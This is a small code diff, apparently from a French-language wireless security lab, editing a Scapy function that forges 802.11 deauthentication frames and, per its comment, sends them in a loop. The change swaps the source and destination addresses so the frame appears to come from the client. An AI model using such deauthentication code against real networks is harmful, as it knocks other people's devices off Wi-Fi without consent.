@@ -11,7 +11,7 @@ from scapy.all import *
 
 def deauth(target_client, target_ap, code):
     # Dans un premier temps, on forge le paquet avec le reason code fourni
-    dot11 = Dot11(addr1=target_client, addr2=target_ap, addr3=target_ap)
+    dot11 = Dot11(addr1=target_ap, addr2=target_client, addr3=target_ap)
     packet = RadioTap()/dot11/Dot11Deauth(reason=code)
 
     #Puis on l'envoie avec la fonciton sendp en boucle
